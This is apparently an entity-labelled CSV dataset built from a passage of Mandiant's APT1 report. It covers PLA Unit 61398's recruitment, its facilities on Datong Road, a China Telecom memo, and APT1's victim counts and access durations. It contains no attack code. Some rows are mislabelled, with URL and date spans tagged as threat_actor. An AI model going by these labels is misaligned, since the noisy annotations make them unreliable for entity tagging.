Mandiant_APT1_Report,Journal of Military Communications Technology,org
Mandiant_APT1_Report," 26, (",O
Mandiant_APT1_Report,2005,timestamp
Mandiant_APT1_Report,"), http://file.lw23.com/f/f1/f14/f14e7b60-3d60-4184-a48f-4a50dd21927c.pdf, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
19 ",O
Mandiant_APT1_Report,Chen Qiyun,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Chen Xiuzhen,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Chen Yiqun,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,Fan Lei,identity
Mandiant_APT1_Report,", “Quantization Evaluation Algorithm for Attack Graph Based on Node Score,” Computer Engineering 36 (",O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report,"), http://www.ecice06.com/CN/article/downloadArticleFile.do?attachType=PDF&id=19627, accessed ",O
Mandiant_APT1_Report,"February 7, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 11 www.mandiant.com

Additionally, there is evidence that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," aggressively recruits new talent from the Science and Engineering 
departments of universities such as ",O
Mandiant_APT1_Report,Harbin Institute of Technology,org
Mandiant_APT1_Report, (哈尔滨工业大学) and ,O
Mandiant_APT1_Report,Zhejiang University School of Computer Science and Technology,org
Mandiant_APT1_Report," (浙江大学计算机学院). The majority of the “profession codes” (专业代码) 
describing positions that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," is seeking to fill require highly technical computer skills. The group also appears 
to have a frequent requirement for strong English proficiency. Table 2 provides two examples of profession codes for 
positions in ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,", along with the required university courses and proficiencies associated with each profession.20

taBLe 2: two profession codes and university recommended courses for students intending to apply for positions 
in ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"

Profession Code required Proficiencies

080902 — Circuits and Systems »» 101 — Political

»» 201 — English

»» 301 — Mathematics

»» 842 — Signal and Digital Circuits (or) 840 - Circuits

»» Interview plus a small written test:

»− Circuits and Systems-based professional knowledge and comprehensive 
capacity

»− Team spirit and ability to work with others to coordinate

»− English proficiency

081000 — ",O
Mandiant_APT1_Report,Information and Communications Engineering,industry
Mandiant_APT1_Report,"

»» 101 - Political

»» 201 – British [English]

»» 301 - Mathematics

»» 844 - Signal Circuit Basis

size and Location of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s Personnel and Facilities
Based on the size of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s physical infrastructure, we estimate that the unit is staffed by hundreds, and 
perhaps thousands. This is an extrapolation based on public disclosures from within ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," describing the location 
and physical installations associated with ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". For example, public sources confirm that ",O
Mandiant_APT1_Report,in early 2007,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Jiangsu Longhai Construction Engineering Group,org
Mandiant_APT1_Report," (江苏龙海建工集团有限公司) completed work on a new building for
",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, located at Datong Road 208 within the Pudong New Area of ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," (上海市浦东新区高桥镇大同路208号),21 
which is referred to as the “",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," Center Building” (61398部队中心大楼). At 12 stories in height, and offering 
130,663 square feet of space, we estimate that this building houses offices for approximately 2,000 people. Figure 4 
through Figure 7 provide overhead views and street-level views of the building and its location, showing its size. This is 
only one of the unit’s several buildings, some of which are even larger.

20 Two Chinese universities hosting ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," recruiting events: 
 • ",O
Mandiant_APT1_Report,Zhejiang University,org
Mandiant_APT1_Report,": http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021 
 • ",O
Mandiant_APT1_Report,Harbin Institute of Technology,org
Mandiant_APT1_Report,": http://today.hit.edu.cn/articles/2004/2-23/12619.htm
21 See http://www.czzbb.net/czzb/YW_Info/YW_ZiGeYS/BaoMingInfo.aspx?YW_RowID=41726&BiaoDuanBH=CZS20091202901&enterprise_
id=70362377-3 for documentation of the contract award to ",O
Mandiant_APT1_Report,Jiangsu Langhai Construction Engineering Group,org
Mandiant_APT1_Report, for ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s Center Building, 
among several other buildings; accessed ",O
Mandiant_APT1_Report,"February 5, 2013",timestamp
Mandiant_APT1_Report,".

http://www.cs.zju.edu.cn/chinese/redir.php?catalog_id=101913&object_id=106021
http://today.hit.edu.cn/articles/2004/2-23/12619.htm


",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 12 www.mandiant.com

FIGure 4: Datong circa ",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report, (prior to ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, Center Building construction) Image Copyright ,O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report," 
DigitalGlobe



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 13 www.mandiant.com

FIGure 5: Datong Circa ",O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, Center Building visible at 208 Datong) Image Copyright ,O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report,"
DigitalGlobe



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 14 www.mandiant.com

FIGure 6: ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," Center Building (main gate, soldiers visible) Image Copyright ",O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report," city8.com



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 15 www.mandiant.com

FIGure 7: ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," Center Building 208 Datong (rear view, possible generator exhausts visible) Image 
Copyright ",O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report," city8.com



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 16 www.mandiant.com

",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," also has a full assortment of support units and associated physical infrastructure, much of which is located 
on a stretch of Datong Road (大同路) in ",O
Mandiant_APT1_Report,Gaoqiaozhen,city
Mandiant_APT1_Report," (高桥镇), in the Pudong New Area (浦东新区) of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," (上
海).22 These support units include a logistics support unit, outpatient clinic, and kindergarten, as well as guesthouses 
located both in ",O
Mandiant_APT1_Report,Gaoqiaozhen,city
Mandiant_APT1_Report, and in other locations in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".23 These amenities are usually associated with large 
military units or units at higher echelons. The close proximity of these amenities supports the contention that ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, occupies a high-level position in the ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, organizational hierarchy (see Figure 1: ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"’s positions within 
the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,").24

",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report, and state-owned enterprise ,O
Mandiant_APT1_Report,China telecom,org
Mandiant_APT1_Report," are Co-building Computer network 
operations Infrastructure
",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, found an internal ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," document online that provides details about the infrastructure provided 
to ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,. The memo (in Figure 8) reveals ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, executives deciding to “co-build” with ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," to 
justify the use of their own inventory in the construction of fiber optic communication lines “based on the principle that 
national defense construction is important.” The letter also appears to indicate that this is a special consideration being 
made outside of ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report,’s “normal renting method” for ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,". Additionally, the memo clarifies the phrase 
“",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,” with the comment “(,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report," 3rd Department, 2nd Bureau).” The memo not only supports the identity 
of ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, as ,O
Mandiant_APT1_Report,GSD,org
Mandiant_APT1_Report,"’s 3rd Department 2nd Bureau, but also reveals the relationship between a “very important 
communication and control department” (",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,") and a state-influenced enterprise.

22 Confirmation of several other ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," support facilities along Datong Road:
 Address: 上海市浦东新区大同路50号 (Pudong New Area, ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", Datong Road 50)
 Building Name: 中国人民解放军第61398部队司令部 (",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," Headquarters)
 Source: Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6 

%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B% E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%B-
B%A4%E9%83%A8, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

 Address: 上海市浦东新区大同路118弄甲 (Pudong New Area, ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", Datong Road 118 A)
 Building Name: 中国人民解放军第61398部队司令部 (",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," Headquarters)

 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%
91%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F%E5%8F%B8%E4%BB%A4%E9%83%A8_0, 
accessed ",threat_actor
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

 Address: 上海市浦东新区高桥镇大同路135号 (Pudong New Area, ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Gaoqiao Town,city
Mandiant_APT1_Report,", Datong Road 135)
 Building Name: 中国人民解放军第61398部队 (",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,")

 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9
1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F_0, accessed ",threat_actor
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

 Address: 上海市浦东新区高桥镇大同路153号 (Pudong New Area, ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Gaoqiao Town,city
Mandiant_APT1_Report,", Datong Road 153)
 Building Name: 中国人民解放军第61398部队 (",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,")
 Chinese phone book listing building name and address; http://114.mingluji.com/minglu/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%9

1%E8%A7%A3%E6%94%BE%E5%86%9B%E7%AC%AC61398%E9%83%A8%E9%98%9F, accessed ",threat_actor
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

 Address: 上海市浦东新区大同路305号 (Pudong New Area, ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,", Datong Road 305)
 Building Name: 中国人民解放军第61398部队后勤部 (Logistics Department of ",O
Mandiant_APT1_Report,The Chinese ,org
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,")(
 Chinese phone book listing building name and address; http://114.mingluji.com/category/%E7%B1%B-

B%E5%9E%8B/%E4%B8%AD%E5%9B%BD%E4%BA%BA%E6%B0%91%E8%A7%A3%E6%94%BE%E5%86%9B?page=69, accessed 
",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".

23 ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, Kindergarden Listed in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Pudong: http://www.pudong-edu.sh.cn/Web/PD/jyzc_school.aspx?SiteID=45&UnitID=2388
24 James C. Mulvenon and Andrew N. D. Yang, editors, The ",O
Mandiant_APT1_Report,People’s Liberation Army,org
Mandiant_APT1_Report," as Organization: Reference Volume v1.0, (",O
Mandiant_APT1_Report,Santa Monica,city
Mandiant_APT1_Report,", CA: 
",O
Mandiant_APT1_Report,RAND Corporation,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,2002,timestamp
Mandiant_APT1_Report,"), 125, http://www.rand.org/pubs/conf_proceedings/CF182.html, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 17 www.mandiant.com

FIGure 8: ",O
Mandiant_APT1_Report,China telecom,org
Mandiant_APT1_Report, Memo discussing ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report," source:  
http://r9.he3.com.cn/%e8%a7%84%e5%88%92/%e9%81%93%e8%B7%aF%e5%8F%8a%e5%85%B6%e
4%BB%96%e8%a7%84%e5%88%92%e5%9B%Be%e7%Ba%B8/%e4%BF%a1%e6%81%aF%e5%9B%a
D%e5%8C%Ba/%e5%85%B3%e4%Ba%8e%e6%80%BB%e5%8F%82%e4%B8%89%e9%83%a8%e4%B
a%8C%e5%B1%80-%e4%B8%8a%e6%B5%B7005%e4%B8%aD%e5%BF%83%e9%9C%80%e4%BD%B-
F%e7%94%a8%e6%88%91%e5%85%aC%e5%8F%B8%e9%80%9a%e4%BF%a1.pdf25

25 This link has Chinese characters in it which are represented in URL encoding



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 18 www.mandiant.com

Market Department Examining Control Affairs Division Report

Requesting Concurrence Concerning the ",O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report," 3rd Department 2nd Bureau 
Request to Use Our Company’s Communication Channel

Division Leader Wu:

",O
Mandiant_APT1_Report,The Chinese People’s Liberation Army,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report," 3rd Department 
2nd Bureau) wrote to us a few days ago saying that, in accordance with their central command 
“8508” on war strategy construction [or infrastructure] need, the ",O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report," 
3rd Department 2nd Bureau (",O
Mandiant_APT1_Report,Gaoqiao,city
Mandiant_APT1_Report, Base) needs to communicate with ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," City 005 
Center (",O
Mandiant_APT1_Report,Shanghai Intercommunication Network Control Center,org
Mandiant_APT1_Report," within East Gate Bureau) 
regarding intercommunication affairs. This bureau already placed fiber-optic cable at the 
East Gate front entrance [road pole]. They need to use two ports to enter our company’s 
East Gate communication channel. The length is about 30m. At the same time, the second 
stage construction (in ",O
Mandiant_APT1_Report,Gaoqiao,city
Mandiant_APT1_Report, Base) needs to enter into our company’s ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Nanhui Communication Park,org
Mandiant_APT1_Report," 005 Center (special-use bureau). This military fiber-optic cable has 
already been placed at the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Nanhui Communication Park,org
Mandiant_APT1_Report," entrance. They need to use 
4 of our company ports inside the ",O
Mandiant_APT1_Report,Nanhui Communication Park,org
Mandiant_APT1_Report," to enter. The length is 600m. 
Upon our division’s negotiation with the 3rd Department 2nd Bureau’s communication branch, 
the military has promised to pay at most 40,000 Yuan for each port. They also hope ",O
Mandiant_APT1_Report,Shanghai Telecom,org
Mandiant_APT1_Report," will smoothly accomplish this task for the military based on the principle that national 
defense construction is important. After checking the above areas’ channels, our company has a 
relatively abundant inventory to satisfy the military’s request.

This is our suggestion: because this is concerning defense construction, and also the 3rd 
Department 2nd Bureau is a very important communication control department, we agree to 
provide the requested channels according to the military’s suggested price. Because this is a 
one-time payment, and it is difficult to use the normal renting method, we suggest our company 
accept one-time payment using the reason of “Military Co-Construction [with ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report,"] of 
Communication Channels” and provide from our inventory. The military’s co-building does not 
interfere with our proprietary rights. If something breaks, the military is responsible to repair it 
and pay for the expenses. After you agree with our suggestion, we will sign an agreement with 
the communication branch of ",O
Mandiant_APT1_Report,61398,threat_actor
Mandiant_APT1_Report," and implement it.

Please provide a statement about whether the above suggestion is appropriate or not.

[Handwritten Note]Agree with the Market Department Examining Control Affairs Division 
suggestion; inside the agreement clearly [...define? (illegible) ...] both party’s responsibilities.

FIGure 9: english translation of ",O
Mandiant_APT1_Report,China telecom,org
Mandiant_APT1_Report," Memo 

 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 19 www.mandiant.com

Synopsis of ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report," 

The evidence we have collected on ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,"’s mission and infrastructure reveals an organization that:

»» Employs hundreds, perhaps thousands of personnel

»» Requires personnel trained in computer security and computer network operations

»» Requires personnel proficient in the English language

»» Has large-scale infrastructure and facilities in the “Pudong New Area” of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"

»» Was the beneficiary of special fiber optic communication infrastructure provided by state-owned enterprise ",O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report," in the name of national defense

The following sections of this report detail ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s cyber espionage and data theft operations. The sheer scale and 
duration of these sustained attacks leave little doubt about the enterprise scale of the organization behind this 
campaign. We will demonstrate that the nature of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s targeted victims and the group’s infrastructure and tactics 
align with the mission and infrastructure of ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 20 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": years oF 
esPIonaGe 

Our evidence indicates that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has been stealing hundreds of terabytes of 
data from at least 141 organizations across a diverse set of industries beginning 
",O
Mandiant_APT1_Report,as early as 2006,timestamp
Mandiant_APT1_Report,". Remarkably, we have witnessed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," target dozens of 
organizations simultaneously. Once the group establishes access to a victim’s 
network, they continue to access it periodically over several months or years 
to steal large volumes of valuable intellectual property, including technology 
blueprints, proprietary manufacturing processes, test results, business plans, 
pricing documents, partnership agreements, emails and contact lists from victim 
organizations’ leadership. We believe that the extensive activity we have directly 
observed represents only a small fraction of the cyber espionage that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has 
committed.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, Puts the “Persistent” in ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,Since 2006,timestamp
Mandiant_APT1_Report, we have seen ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," relentlessly expand its access to new victims. 
Figure 10 shows the timeline of the 141 compromises we are aware of; each 
marker in the figure represents a separate victim and indicates the earliest 
confirmed date of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity in that organization’s network.26

With the ephemeral nature of electronic evidence, many of the dates of earliest 
known ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, activity shown here underestimate the duration of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s presence in 
the network.

FIGure 10: timeline showing dates of earliest known ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity in the 
networks of the 141 organizations in which ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has observed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
conducting cyber espionage.

26 Figure 10 shows that we have seen ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," compromise an increasing number of organizations each 
year, which may reflect an increase in ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s activity. However, this increase may also simply reflect 
",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,’s expanding visibility into ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s activities as the company has grown and victims’ awareness 
of cyber espionage activity in their networks has improved.

",O
Mandiant_APT1_Report,2006,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2008,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2009,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2010,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2012,timestamp
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report,"

Organizations compromised 
by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," over time



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 21 www.mandiant.com

Longest time period within
which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has continued 
to access a victim’s network:

",O
Mandiant_APT1_Report,"4 Years, 10 Months",timestamp
Mandiant_APT1_Report,"

Once ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has compromised a network, they repeatedly monitor and steal 
proprietary data and communications from the victim for months or even 
years. For the organizations in Figure 10, we found that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintained 
access to the victim’s network for an average of ",O
Mandiant_APT1_Report,356 days,timestamp
Mandiant_APT1_Report,".27 The longest time 
period ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," maintained access to a victim’s network was at least 1,764 days, 
or four years and ten months. ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," was not continuously active on a daily 
basis ",O
Mandiant_APT1_Report,during this time period,timestamp
Mandiant_APT1_Report,"; however, in the vast majority of cases we 
observed, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," continued to commit data theft as long as they had access to 
the network.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s Geographic & Industry Focus

The organizations targeted by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," primarily conduct their operations in English. However, we have also seen the 
group target a small number of non-English speaking victims. A full 87% of the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," victims we have observed are 
headquartered in countries where English is the native language (see Figure 11). This includes 115 victims located 
in the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, and seven in ,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report, and the ,O
Mandiant_APT1_Report,United Kingdom,country
Mandiant_APT1_Report,". Of the remaining 19 victims, 17 use English as a primary 
language for operations. These include international cooperation and development agencies, foreign governments 
in which English is one of multiple official languages, and multinational conglomerates that primarily conduct their 
business in English. Only two victims appear to operate using a language other than English. Given that English-
language proficiency is required for many members of ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,", we believe that the two non-English speaking 
victims are anomalies representing instances in which ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," performed tasks outside of their normal activities. 

27  This is based on 91 of the 141 victim organizations shown. In the remaining cases, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity is either ongoing or else we do not have visibility 
into the last known date of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity in the network.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 22 www.mandiant.com

5 ",O
Mandiant_APT1_Report,United Kingdom,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,Norway,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,France,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,South Africa,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,Japan,country
Mandiant_APT1_Report,"

2 ",O
Mandiant_APT1_Report,Singapore,country
Mandiant_APT1_Report,"

2 ",O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report,"

3 ",O
Mandiant_APT1_Report,India,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,UAE,country
Mandiant_APT1_Report,"

3 ",O
Mandiant_APT1_Report,Israel,country
Mandiant_APT1_Report,"
2 ",O
Mandiant_APT1_Report,Switzerland,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,Luxemborg,country
Mandiant_APT1_Report,"

1 ",O
Mandiant_APT1_Report,Belgium,country
Mandiant_APT1_Report,"

115 ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,"

2 ",O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,"

OBSERVED GLOBAL ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," ACTIVITY

FIGure 11: Geographic location of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s victims. In the case of victims with a multinational presence, the 
location shown reflects either the branch of the organization that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," compromised (when known), or else is the 
location of the organization’s headquarters.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has demonstrated the capability and intent to steal from dozens of organizations across a wide range of 
industries virtually simultaneously. Figure 12 provides a view of the earliest known date of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," activity against all of 
the 141 victims we identified, organized by the 20 major industries they represent. The results suggest that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s 
mission is extremely broad; the group does not target industries systematically but more likely steals from an enormous 
range of industries on a continuous basis. Since the organizations included in the figure represent only the fraction 
of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," victims that we confirmed directly, the range of industries that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," targets may be even broader than our 
findings suggest.

Further, the scope of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s parallel activities implies that the group has significant personnel and technical resources 
at its disposal. ",O
Mandiant_APT1_Report,In the first month of 2011,timestamp
Mandiant_APT1_Report,", for example, Figure 12 shows that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," successfully compromised 17 
